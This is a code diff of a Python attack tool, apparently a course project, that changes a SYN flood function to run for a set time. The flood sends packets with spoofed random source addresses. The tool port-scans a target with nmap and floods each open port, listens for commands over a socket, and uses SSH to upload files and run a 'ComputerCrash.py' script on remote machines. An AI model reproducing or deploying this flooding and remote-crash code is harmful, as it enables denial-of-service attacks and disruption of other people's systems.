@@ -6,11 +6,12 @@ import nmap
 import string
 import requests
 import uuid
+import time
 
-def synflood(TARGET,TARGETPORT):
-	PACKETS_TO_SEND = 1000
-
-	for index in range(PACKETS_TO_SEND):
+def synflood(TARGET,TARGETPORT,TIME):
+	currenttime = time.time()
+	timetostop = currenttime + TIME
+	while time.time() < timetostop:
 		ippacket = IP()
 		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
 		ippacket.dst = TARGET
@@ -51,8 +52,8 @@ def installcontent(TARGET):
 		sftp.put('/root/CS445-Project/content.txt', '/root/content.txt')
 		client.exec_command('python ComputerCrash.py')
 	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
-		#print(e)
 		return None
+
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 HOST_SERVER = ' '
@@ -87,7 +88,7 @@ while True:
 			nm.scan(parseddata[3],'1-65535')
 			getopenports = nm[parseddata[3]].all_tcp()
 			for index in range(len(getopenports)):
-				synflood(parseddata[3],getopenports[index])
+				synflood(parseddata[2],getopenports[index],parseddata[1])
 			with open("log.txt", 'a') as f:
 				f.write(str(nm[parseddata[3]].all_tcp()))
 
